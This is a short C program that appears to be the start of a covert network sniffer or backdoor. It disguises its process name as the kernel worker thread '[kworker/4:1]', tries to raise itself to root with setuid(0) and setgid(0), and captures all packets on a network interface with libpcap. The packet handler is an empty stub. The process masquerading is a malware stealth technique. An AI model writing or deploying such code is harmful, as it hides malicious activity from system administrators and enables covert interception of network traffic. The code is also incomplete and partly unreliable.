#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <unistd.h>

#define MASK "[kworker/4:1]"

int startPacketCap();
void packetRecieved(u_char*, const struct pcap_pkthdr*, const u_char*);

int main(int argc, char *argv[])
{
	/* mask the process name */
	memset(argv[0], 0, strlen(argv[0]));	
	strcpy(argv[0], MASK);
	prctl(PR_SET_NAME, MASK, 0, 0);

	/* change the UID/GID to 0 (raise privs) */
	setuid(0);
	setgid(0);
	if(startPacketCap() == 0)
	{
		return 0;
	}
	return 1;
}

int startPacketCap() { 
    pcap_if_t *all_dev, *d; 
    char errbuf[PCAP_ERRBUF_SIZE];
   	pcap_t* nic_descr;
   	bpf_u_int32 net;
    bpf_u_int32 mask;
   	
	if (pcap_findalldevs(&all_dev, errbuf) == -1)
    {
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		return 0;
	}
	
        /* Find a suitable nic from the device list */
    for (d = all_dev; d; d = d->next)
    {
        if (pcap_lookupnet(d->name, &net, &mask, errbuf) != -1)
        {
            break;
        }
    }
			
	// open device for reading 
	nic_descr = pcap_open_live (d->name, BUFSIZ, 0, -1, errbuf);
	if (nic_descr == NULL)
	{ 
		printf("pcap_open_live(): %s\n",errbuf); 
		return 0; 
	}

	// Call pcap_loop(..) and pass in the callback function 
	pcap_loop(nic_descr, -1, packetRecieved, NULL);

	return 1;
}

void packetRecieved(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	
}
